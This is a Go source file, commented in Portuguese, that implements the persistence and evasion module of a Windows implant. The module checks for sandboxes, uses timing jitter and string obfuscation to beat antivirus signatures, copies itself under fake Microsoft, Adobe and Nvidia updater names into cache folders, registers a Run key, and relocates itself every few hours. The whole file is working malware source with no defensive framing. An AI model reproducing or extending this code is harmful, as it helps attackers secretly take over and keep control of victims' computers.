package stealth

import (
	"crypto/rand"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	// Mutex global para garantir única instância
	globalMutex     windows.Handle
	mutexName       = "Global\\MicrosoftWindowsUpdateSyncMutex"
	persistenceLock sync.Mutex
)

// Nomes genéricos e convincentes para o executável na Startup
var legitimateNames = []string{
	"OneDriveUpdate.exe",
	"WindowsHealthCheck.exe",
	"MicrosoftEdgeUpdate.exe",
	"AdobeUpdateService.exe",
	"GoogleUpdateTask.exe",
	"NvidiaDriverUpdate.exe",
	"RealtekAudioService.exe",
	"IntelGraphicsUpdate.exe",
	"SystemTelemetryService.exe",
	"WindowsDefenderScheduler.exe",
}

// Caminhos seguros para migração (User-Mode, sem necessidade de Admin)
var safePaths = []string{
	"AppData\\Local\\Temp",
	"AppData\\Local\\Microsoft\\Windows\\INetCache",
	"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache",
	"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache",
	"AppData\\Roaming\\Microsoft\\Windows\\Recent",
	"AppData\\Local\\Microsoft\\CLR_v4.0",
	"Documents",
}

// MigrationConfig armazena informações da última migração
type MigrationConfig struct {
	LastMigration time.Time
	CurrentPath   string
	MigrationCount int
}

var migrationState = MigrationConfig{
	LastMigration: time.Time{},
	CurrentPath:   "",
	MigrationCount: 0,
}

// InstallPersistence instala mecanismo de persistência furtivo
// Prioriza Startup Folder ao invés de Registry (menos monitorado)
func InstallPersistence() error {
	persistenceLock.Lock()
	defer persistenceLock.Unlock()

	// Anti-emulação e anti-sandbox
	if !AntiEmulation() {
		return fmt.Errorf("ambiente não seguro")
	}

	// Delay inicial aleatório (evita detecção por timing)
	SleepWithJitter(2000)

	// Verificar se já está instalado
	if IsInstalled() {
		return nil
	}

	// Quebrar assinatura antes de operações sensíveis
	BreakSignature()

	// Obter caminho atual do executável
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("falha ao obter caminho do executável: %w", err)
	}

	// Delay entre operações
	RandomDelay()

	// Obter caminho de instalação
	installPath := GetInstallPath()
	if installPath == "" {
		return fmt.Errorf("falha ao determinar caminho de instalação")
	}

	// Criar diretório se não existir
	installDir := filepath.Dir(installPath)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		// Se falhar, tentar caminho alternativo
		installPath = getAlternativeInstallPath()
		installDir = filepath.Dir(installPath)
		if err := os.MkdirAll(installDir, 0755); err != nil {
			return fmt.Errorf("falha ao criar diretório: %w", err)
		}
	}

	// Sleep antes de copiar arquivo
	SleepWithJitter(1000)

	// Copiar executável para o local de instalação
	if err := copyFile(exePath, installPath); err != nil {
		return fmt.Errorf("falha ao copiar executável: %w", err)
	}

	// Delay pós-cópia
	RandomDelay()
	BreakSignature()

	// Instalar múltiplas camadas de persistência para redundância
	if err := InstallMultiLayerPersistence(installPath); err != nil {
		// Se falhar completamente, limpar arquivo copiado
		os.Remove(installPath)
		return fmt.Errorf("falha ao criar persistência: %w", err)
	}

	// Atualizar estado de migração
	migrationState.CurrentPath = installPath
	migrationState.LastMigration = time.Now()

	// Delay final
	RandomDelay()

	return nil
}

// createStartupShortcut cria um atalho na pasta Startup do Windows
func createStartupShortcut(targetPath string) error {
	// Por enquanto, usar registry como método primário por ser mais confiável
	// Criar atalhos .lnk requer COM/OLE que é complexo em Go puro
	// TODO: Implementar criação de .lnk usando syscalls ou biblioteca externa
	return createRegistryPersistence(targetPath)
}

// createRegistryPersistence cria entrada no Registry (HKCU - não requer admin)
func createRegistryPersistence(targetPath string) error {
	// Delay anti-detecção
	RandomDelay()
	BreakSignature()

	// Construir caminho do registry dinamicamente (anti-assinatura)
	regPath := GetDeobfuscated(obfStr_regRun)

	// Sleep antes de operação sensível
	SleepWithJitter(500)

	// Usar HKCU para não precisar de privilégios admin
	key, err := registry.OpenKey(registry.CURRENT_USER,
		regPath,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("falha ao abrir chave de registro: %w", err)
	}
	defer key.Close()

	// Delay entre operações
	RandomDelay()

	// Nome da entrada (usando nome genérico)
	valueName := getRandomLegitimateNameWithoutExt()

	// Sleep antes de escrever
	SleepWithJitter(300)

	// Definir valor
	err = key.SetStringValue(valueName, targetPath)
	if err != nil {
		return fmt.Errorf("falha ao definir valor de registro: %w", err)
	}

	// Delay pós-escrita
	RandomDelay()

	return nil
}

// RemovePersistence remove mecanismos de persistência instalados
func RemovePersistence() error {
	persistenceLock.Lock()
	defer persistenceLock.Unlock()

	var errors []error

	// Remover do Registry
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err == nil {
		defer key.Close()

		// Tentar todos os nomes possíveis
		for _, name := range legitimateNames {
			nameWithoutExt := strings.TrimSuffix(name, ".exe")
			_ = key.DeleteValue(nameWithoutExt) // Ignorar erros
		}
	}

	// Remover arquivo instalado
	if migrationState.CurrentPath != "" {
		if err := os.Remove(migrationState.CurrentPath); err != nil {
			errors = append(errors, err)
		}
	}

	// Remover da pasta Startup
	startupPath, err := getStartupFolder()
	if err == nil {
		for _, name := range legitimateNames {
			shortcutName := strings.TrimSuffix(name, ".exe") + ".lnk"
			shortcutPath := filepath.Join(startupPath, shortcutName)
			_ = os.Remove(shortcutPath) // Ignorar erros
		}
	}

	if len(errors) > 0 {
		return fmt.Errorf("erros ao remover persistência: %v", errors)
	}

	return nil
}

// IsInstalled verifica se persistência está instalada
func IsInstalled() bool {
	// Verificar Registry
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE)
	if err == nil {
		defer key.Close()

		// Verificar se algum dos nomes conhecidos existe
		for _, name := range legitimateNames {
			nameWithoutExt := strings.TrimSuffix(name, ".exe")
			_, _, err := key.GetStringValue(nameWithoutExt)
			if err == nil {
				return true
			}
		}
	}

	// Verificar pasta Startup
	startupPath, err := getStartupFolder()
	if err == nil {
		for _, name := range legitimateNames {
			shortcutName := strings.TrimSuffix(name, ".exe") + ".lnk"
			shortcutPath := filepath.Join(startupPath, shortcutName)
			if _, err := os.Stat(shortcutPath); err == nil {
				return true
			}
		}
	}

	return false
}

// GetInstallPath retorna o caminho onde o implant deve ser instalado
func GetInstallPath() string {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return ""
	}

	// Escolher caminho aleatório da lista de caminhos seguros
	safePath := getRandomSafePath()
	legitimateName := getRandomLegitimateFileName()

	return filepath.Join(userProfile, safePath, legitimateName)
}

// getAlternativeInstallPath retorna caminho alternativo caso o primário falhe
func getAlternativeInstallPath() string {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return filepath.Join(os.TempDir(), getRandomLegitimateFileName())
	}

	// Usar Documents como fallback (sempre existe e tem permissão)
	return filepath.Join(userProfile, "Documents", getRandomLegitimateFileName())
}

// MigrateLocation implementa Melt & Move - migra o agente para nova localização
func MigrateLocation() error {
	persistenceLock.Lock()
	defer persistenceLock.Unlock()

	// Verificar se já migrou recentemente (evitar migração excessiva)
	if time.Since(migrationState.LastMigration) < 4*time.Hour {
		return nil
	}

	// Obter caminho atual
	currentPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("falha ao obter caminho atual: %w", err)
	}

	// Gerar novo caminho
	newPath := GetInstallPath()
	if newPath == "" || newPath == currentPath {
		return fmt.Errorf("falha ao gerar novo caminho")
	}

	// Criar diretório de destino
	newDir := filepath.Dir(newPath)
	if err := os.MkdirAll(newDir, 0755); err != nil {
		return fmt.Errorf("falha ao criar diretório de destino: %w", err)
	}

	// Copiar para novo local
	if err := copyFile(currentPath, newPath); err != nil {
		return fmt.Errorf("falha ao copiar para novo local: %w", err)
	}

	// Atualizar persistência para apontar para novo local
	if err := RemovePersistence(); err != nil {
		// Continuar mesmo se falhar
	}

	migrationState.CurrentPath = newPath
	if err := createRegistryPersistence(newPath); err != nil {
		// Limpar arquivo criado se falhar
		os.Remove(newPath)
		return fmt.Errorf("falha ao atualizar persistência: %w", err)
	}

	// Atualizar estado
	migrationState.LastMigration = time.Now()
	migrationState.MigrationCount++

	// TODO: Reiniciar processo no novo local e matar o atual
	// Por segurança, não implementado ainda para evitar perda de conexão

	return nil
}

// ShouldMigrate verifica se é hora de migrar baseado em intervalo aleatório
func ShouldMigrate() bool {
	// Intervalo entre 4 e 12 horas
	minInterval := 4 * time.Hour
	maxInterval := 12 * time.Hour

	timeSinceLast := time.Since(migrationState.LastMigration)

	// Gerar intervalo aleatório
	randomInterval := minInterval + time.Duration(randomInt(int64(maxInterval-minInterval)))

	return timeSinceLast >= randomInterval
}

// EnsureSingleInstance garante que apenas uma instância está rodando
func EnsureSingleInstance() bool {
	// Delay inicial
	RandomDelay()

	// Construir nome do mutex dinamicamente
	mutexFullName := GetDeobfuscated(obfStr_globalPrefix) + strings.Split(mutexName, "\\")[1]

	// Criar mutex nomeado
	mutexNamePtr, err := windows.UTF16PtrFromString(mutexFullName)
	if err != nil {
		return false
	}

	// Sleep antes de criar mutex
	SleepWithJitter(200)

	mutex, err := windows.CreateMutex(nil, false, mutexNamePtr)
	if err != nil {
		return false
	}

	// Verificar se mutex já existe
	if err := windows.GetLastError(); err == windows.ERROR_ALREADY_EXISTS {
		windows.CloseHandle(mutex)
		return false
	}

	// Armazenar handle global (não fechar - mantém durante toda execução)
	globalMutex = mutex
	return true
}

// ─────────────────────────────────────────────────────────────────────────────
// Funções auxiliares
// ─────────────────────────────────────────────────────────────────────────────

// getStartupFolder retorna o caminho da pasta Startup do Windows
func getStartupFolder() (string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", fmt.Errorf("variável APPDATA não encontrada")
	}

	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	return startupPath, nil
}

// getRandomLegitimateFileName retorna um nome aleatório da lista
func getRandomLegitimateFileName() string {
	idx := randomInt(int64(len(legitimateNames)))
	return legitimateNames[idx]
}

// getRandomLegitimateNameWithoutExt retorna nome sem extensão
func getRandomLegitimateNameWithoutExt() string {
	name := getRandomLegitimateFileName()
	return strings.TrimSuffix(name, ".exe")
}

// getRandomSafePath retorna caminho aleatório da lista de caminhos seguros
func getRandomSafePath() string {
	idx := randomInt(int64(len(safePaths)))
	return safePaths[idx]
}

// copyFile copia um arquivo de src para dst
func copyFile(src, dst string) error {
	// Abrir arquivo origem
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	// Criar arquivo destino
	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	// Copiar conteúdo
	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	// Sincronizar para disco
	err = destFile.Sync()
	if err != nil {
		return err
	}

	// Copiar permissões
	sourceInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	return os.Chmod(dst, sourceInfo.Mode())
}

// randomInt gera um número aleatório criptograficamente seguro
func randomInt(max int64) int64 {
	if max <= 0 {
		return 0
	}

	n, err := rand.Int(rand.Reader, big.NewInt(max))
	if err != nil {
		// Fallback para time-based
		return time.Now().UnixNano() % max
	}

	return n.Int64()
}
